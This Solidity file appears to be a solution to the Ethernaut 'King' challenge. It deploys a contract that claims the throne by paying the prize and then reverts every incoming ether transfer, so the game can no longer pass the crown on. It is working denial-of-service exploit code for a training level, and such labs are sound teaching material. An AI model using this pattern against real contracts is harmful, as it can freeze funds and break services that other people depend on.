//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IKing {
    function prize() external view returns (uint256);
}

contract KingExploit {
    IKing public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `King` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824
    constructor(IKing _implementation) {
        implementation = _implementation;
    }

    /// @notice `King` game contract is broken cause this contract (the new king) cannot receive ether
    function exploit() external payable {
        require(msg.value >= implementation.prize(), "increase sent ether");
        (bool success, ) = address(implementation).call{value: msg.value}("");
        require(success, "call failed");
    }

    /// @notice This contract cannot accept ether from `King` game contract
    receive() external payable {
        require(false, "cannot receive ether");
    }
}
